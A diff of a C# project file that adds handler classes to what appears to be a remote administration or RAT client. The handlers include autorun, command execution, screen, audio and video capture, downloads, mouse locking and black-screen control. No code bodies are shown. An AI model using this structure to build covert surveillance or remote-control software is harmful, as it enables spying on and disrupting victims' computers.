@@ -106,15 +106,22 @@
     <Reference Include="System.Windows.Forms" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Handlers\AbstractRequestHandler.cs" />
     <Compile Include="Handlers\RequestGetProcessesHandler.cs" />
     <Compile Include="Handlers\RequestAutoRunHandler.cs" />
     <Compile Include="Handlers\RequestGetDrivesHandler.cs" />
     <Compile Include="Handlers\RequestGetSubFilesOrDirsHandler.cs" />
-    <Compile Include="Handlers\RequestCreateFileOrDirHandler.cs" />
-    <Compile Include="Handlers\RequestDeleteFileOrDirHandler.cs" />
+    <Compile Include="Handlers\RequestOpeFileOrDirHandler.cs" />
     <Compile Include="Handlers\RequestPowerHandler.cs" />
     <Compile Include="Handlers\RequestOpenUrlHandler.cs" />
     <Compile Include="Handlers\RequestCommandHandler.cs" />
+    <Compile Include="Handlers\RequestCaptureScreenHandler.cs" />
+    <Compile Include="Handlers\RequestDownloadHandler.cs" />
+    <Compile Include="Handlers\RequestLockMouseHandler.cs" />
+    <Compile Include="Handlers\RequestBlackScreenHandler.cs" />
+    <Compile Include="Handlers\RequestMsgBoxHandler.cs" />
+    <Compile Include="Handlers\RequestOpeCDHandler.cs" />
+    <Compile Include="Handlers\RequestPlayMusicHandler.cs" />
     <Compile Include="Services\CaptureVideoClient.cs" />
     <Compile Include="Handlers\RequestOpeRegistryValueNameHandler.cs" />
     <Compile Include="Handlers\RequestCaptureAudioHandler.cs" />
